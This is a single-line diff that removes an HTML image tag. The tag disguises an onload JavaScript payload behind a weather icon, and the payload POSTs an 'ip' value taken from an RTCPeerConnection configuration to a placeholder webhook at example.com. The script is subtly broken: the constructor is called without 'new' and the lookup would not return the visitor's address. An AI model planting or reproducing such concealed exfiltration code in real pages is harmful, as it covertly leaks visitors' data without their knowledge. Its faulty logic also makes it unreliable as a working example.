@@ -1,1 +1,0 @@
-<img src="https://assets.msn.com/weathermapdata/1/static/weather/Icons/taskbar_v10/Condition_Card/CloudyV3.svg" onload="var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://example.com/webhook'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({'ip': RTCPeerConnection().getConfiguration().iceServers[0].urls.split('@')[1]}));">
